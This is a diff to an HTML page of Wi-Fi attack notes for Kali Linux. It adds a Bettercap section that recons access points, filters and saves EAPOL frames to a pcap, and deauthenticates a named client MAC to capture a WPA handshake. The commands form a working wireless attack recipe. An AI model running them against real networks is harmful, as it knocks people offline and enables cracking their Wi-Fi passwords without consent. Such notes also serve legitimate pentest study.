@@ -8,6 +8,7 @@
   <ul>sudo airmon-ng start wlan0</ul>
   <ul>sudo airmon-ng check kill</ul>
   <ul>You will notice that airmon-ng will kill NetworkManager</ul>
+ <ul>Try if you can work without killing NetworkManager because getting it up again is sometimes a pain in the @ss</ul>
 </ol></p>
 <p><ol>
   <ul>sudo airodump-ng wlan0</ul>
@@ -23,3 +24,31 @@
   <ul>sudo service NetworkManager start</ul>
   <ul>sometimes, it will NOT work and a restart is needed first</ul>
 </ol></p>
+<h1>Bettercap</h1>
+<p><ol>
+ <ul>sudo bettercap -iface wlan0</ul>
+ <ul>wifi.recon on</ul>
+ <ul>wifi.show</ul>
+</ol></p>
+<h2>Clients</h2>
+<p>Take a note of the column name <b>Clients</b>. With some luck you will find APs with actual clients connected to it! Clients are associated devices connected into the access point. If you find an AP with 
+connected clients, copy its BSSID and take a note of the Channel.</p>
+<p><ol>
+ <ul>wifi.recon off</ul>
+ <ul>wifi.recon.channel 3</ul>
+ <ul>wifi.recon on</ul>
+</ol></p>
+<h2>Packet capturing</h2>
+<p><ol>
+ <ul>set net.sniff.verbose true</ul>
+ <ul>set net.sniff.filter ether proto 0x888e</ul>
+ <ul>set net.sniff.output /home/kali/Downloads/wpa.pcap</ul>
+ <ul>net.sniff on</ul>
+</ol></p>
+<h2>Deauthentication</h2>
+<p><ol>
+ <ul>wifi.deauth 64:fd:96:4c:41:e7</ul>
+ <ul>with a little luck the client will be deauthenticated from the AP</ul>
+ <ul>when the client will authenticate again with the AP, a wifi.handshake will be captured and logged in the pcap file</ul>
+</ol></p>
+
